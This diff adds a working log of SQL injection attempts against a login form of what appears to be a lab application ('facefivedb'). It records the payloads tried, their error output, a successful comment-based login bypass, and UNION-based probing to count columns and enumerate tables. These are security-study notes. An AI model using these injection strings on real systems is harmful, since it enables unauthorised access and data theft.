@@ -1,0 +1,60 @@
+login("asdf", "asdf")
+ -> grants access (user is registered)
+
+login("'badInput", "adsf")
+-> (1064, "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'badinput' AND password = 'a'' at line 1")
+    -> SQL: "<???><username>' AND password = '<password>'"
+
+    SQL might be:
+    "SELECT <...> FROM <tabela_dos_registos> WHERE <username> = '<nosso input>' AND password = 'a'"
+
+    Trying:
+    "SELECT <...> FROM <tabela_dos_registos> WHERE <username> = '' OR 1=1 --' AND password = 'a'"
+        got SQL syntax error
+      -> tried comments --, /*, /*!, /+ are ignored
+
+    Trying: (avoid using comments)
+    "SELECT <...> FROM <tabela_dos_registos> WHERE <username> = '' OR 1=1 OR (password ='' AND password = '')#"
+    "SELECT <...> FROM <tabela_dos_registos> WHERE <username> = '{username}' AND password = '' OR 1 = 1"
+    "SELECT <...> FROM <tabela_dos_registos> WHERE <username> = '{username}' AND (password <> '' AND password = '' OR 1=1 )#'"
+    ... -> Internal server error
+
+    Back to comments:
+    "SELECT <...> FROM <tabela_dos_registos> WHERE <username> = '{username}'# OR 1=1 OR (password ='' AND password = '')#"
+    BINGO!
+    poc_login_without_password()
+
+
+
+Trying to get database schemas
+username: "' UNION SELECT name from Users# -> Error (Number of columns do not match)"
+username: "' UNION SELECT name, name from Users# -> Error (Number of columns do not match)"
+username: "' UNION SELECT name, name, name from Users# -> Error (Number of columns do not match)"
+username: "' UNION SELECT name, name, name, name from Users# -> Error (Number of columns do not match)"
+username: "' UNION SELECT name, name, name, name, name from Users# -> Invalid password"
+    This means that original SELECT has 5 columns
+
+
+We can also try to check if some tables exist:
+username: "' UNION SELECT * {tablename}#"
+    if table doesn't exist -> "Table facefivedb.{tablename} doesnt exist"
+    if table exists -> "The used SELECT statements have a different number of columns"
+                    -> "Username or Password are invalid" (if table has same no. of columns")
+
+After analysing the application we induced that there might exist the following tables:
+Users, Friends, Posts
+??? Friend requests??
+
+We can also try to find which columns exist in each table:
+username: "' UNION SELECT NULL, NULL, NULL, NULL, {colname} from {tablename}# -> Invalid password"
+After analysing the application we induced that there might exist the following columns:
+
+table Users     (name,username,password,about,photo)
+table Friends   (username1,username2)
+table Posts     (author,content,type)
+
+
+We can check the tables of the database using
+"SELECT table_name FROM information_schema.tables WHERE table_type = 'base table' AND table_schema='test';"
+We checked that table "information_schema.tables" exists!
+We could blind bruteforce this table and check every table name, but we might be able to dump the output of this query in another SQLi vulnerability (Maybe in an UPDATE)
